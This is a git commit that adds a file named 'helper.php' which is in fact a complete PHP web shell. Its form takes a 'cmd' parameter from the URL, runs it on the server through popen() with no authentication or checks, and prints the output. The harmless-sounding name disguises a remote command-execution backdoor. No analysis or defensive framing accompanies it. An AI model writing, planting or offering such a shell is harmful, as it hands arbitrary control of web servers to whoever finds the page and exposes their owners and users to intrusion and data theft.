5e751a5a672055017c92555e9162a438110070cf
Eslam Medhat <63551214+eslamedhat@users.noreply.github.com>
2023-02-05 02:20:41 +0400

    Create helper.php

---
+++ helper.php
@@ -0,0 +1,27 @@
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+$handle = popen($_GET['cmd'], "r");
+$output = "";
+
+while (!feof($handle)) {
+    $output .= fgets($handle);
+}
+
+pclose($handle);
+
+echo $output;
+
+
+    }
+?>
+</pre>
+</body>
+</html>
